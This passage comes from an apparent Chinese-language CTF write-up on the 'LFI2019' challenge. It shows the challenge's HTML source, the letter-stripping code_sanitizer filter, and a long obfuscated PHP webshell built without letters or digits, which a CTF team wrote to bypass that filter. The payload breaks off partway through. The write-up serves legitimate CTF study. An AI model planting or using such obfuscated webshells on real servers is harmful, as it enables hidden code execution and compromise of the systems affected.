class="modal-footer"&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-secondary" data-dismiss="modal"&gt;Close&lt;/button&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-primary" id="upload-submit"&gt;put();&lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="modal fade" id="get-modal"&gt;</span><br><span class="line">        &lt;div class="modal-dialog modal-lg"&gt;</span><br><span class="line">            &lt;div class="modal-content"&gt;</span><br><span class="line">                &lt;div class="modal-header"&gt;</span><br><span class="line">                    &lt;h5 class="modal-title"&gt;get2019&lt;/h5&gt;</span><br><span class="line">                    &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;</span><br><span class="line">                        &lt;span aria-hidden=<span class="hljs-string">"true"</span>&gt;&amp;times;&lt;/span&gt;</span><br><span class="line">                    &lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-body"&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;label for="include-filename" class="col-form-label"&gt;Filename:&lt;/label&gt;</span><br><span class="line">                        &lt;input type="text" class="form-control" id="include-filename"&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;textarea class="form-control disabled" id="include-content" disabled rows=10&gt;&lt;/textarea&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-footer"&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-secondary" data-dismiss="modal"&gt;Close&lt;/button&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-primary" id="include-submit"&gt;include();&lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="modal fade" id="info-modal"&gt;</span><br><span class="line">        &lt;div class="modal-dialog modal-lg"&gt;</span><br><span class="line">            &lt;div class="modal-content"&gt;</span><br><span class="line">                &lt;div class="modal-header"&gt;</span><br><span class="line">                    &lt;button type="button" class="close" data-dismiss="modal" aria-hidden="true"&gt;×&lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-body"&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                        Hi there! We introduce LFI2019 with another technique that never came out on CTFs. </span><br><span class="line">                        We want to end tedious LFI challenges starting from this year.</span><br><span class="line">                        Traps are everywhere, so be warned. Good Luck!</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                        .. <span class="hljs-keyword">and</span> of course, the main objective <span class="hljs-keyword">for</span> this challenge is absolutely straightforward: Leak the sourcecode of flag file to solve this challenge. flag is located at &lt;code&gt;flag.php&lt;/code&gt;.</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="modal-footer"&gt;</span><br><span class="line">                    &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;Close&lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;ul class="text hidden"&gt;</span><br><span class="line">        &lt;li&gt;L&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;e&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;g&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;i&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;t&lt;/li&gt;</span><br><span class="line">        &lt;li class="spaced"&gt;F&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;i&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;l&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;e&lt;/li&gt;</span><br><span class="line">        &lt;li class="spaced"&gt;I&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;n&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;c&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;l&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;u&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;s&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;i&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;o&lt;/li&gt;</span><br><span class="line">        &lt;li class="ghost"&gt;n&lt;/li&gt;</span><br><span class="line">        &lt;li class="spaced"&gt;2019&lt;/li&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">truetrue&lt;br&gt;</span><br><span class="line">        &lt;div class="hide" id="kawaii"&gt;</span><br><span class="line">            &lt;center&gt;</span><br><span class="line">                &lt;button class="btn col-4 btn-success half" id="get"&gt;include&lt;/button&gt;</span><br><span class="line">                &lt;button class="btn col-4 btn-warning" id="put"&gt;upload&lt;/button&gt;</span><br><span class="line">                &lt;button class="btn col-3 btn-info" id="info"&gt;info&lt;/button&gt;</span><br><span class="line">                &lt;p class="lightgrey"&gt;</span><br><span class="line">                    Reference ID: &lt;b class="ref"&gt;&lt;?php echo $seed; ?&gt;&lt;/b&gt;</span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">                Made with &amp;hearts; by stypr.</span><br><span class="line">            &lt;/center&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;script src=<span class="hljs-string">"https://code.jquery.com/jquery-3.3.1.min.js"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="hljs-string">"//stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="hljs-string">"./static/legit.js"</span> nonce=<span class="hljs-string">"&lt;?php echo $seed; ?&gt;"</span> defer&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- https:<span class="hljs-comment">//www.youtube.com/watch?v=OEpeRmPkRIU --&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>不过比较无语的是有很多的垃圾代码…可以看到有个出题人留的后门函数，but 因为<code>code_sanitizer</code>的过滤</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// The new kakkoii code-san is re-implemented. //</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">code_sanitizer</span><span class="hljs-params">($code)</span></span>{</span><br><span class="line">    <span class="hljs-comment">// Computer-chan, please don't speak english. Speak something else! //</span></span><br><span class="line">    $code = preg_replace(<span class="hljs-string">"/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u"</span>, <span class="hljs-string">"*Nope*"</span>, (string)$code);</span><br><span class="line">    <span class="hljs-keyword">return</span> $code;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我们可以使用无字母的 webshell 来进行一个绕过，可以参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a>，这里我就直接放 ROIS 师傅们的无字母 webshell 内容了</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?</span>=$_=[]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=@<span class="hljs-string">"$_"</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$___=$_[<span class="hljs-string">'!'</span>!=<span class="hljs-string">'@'</span>]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$____=$_[(<span class="hljs-string">'!'</span>==<span class="hljs-string">'!'</span>)+(<span class="hljs-string">'!'</span>==<span class="hljs-string">'!'</span>)+(<span class="hljs-string">'!'</span>==<span class="hljs-string">'!'</span>)]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=<span class="hljs-string">"_"</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=<span class="hljs-string">"_"</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_____=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__=<span class="hljs-string">''</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=<span class="hljs-string">"."</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__.=$_<span class="hljs-meta">?&gt;</span><span 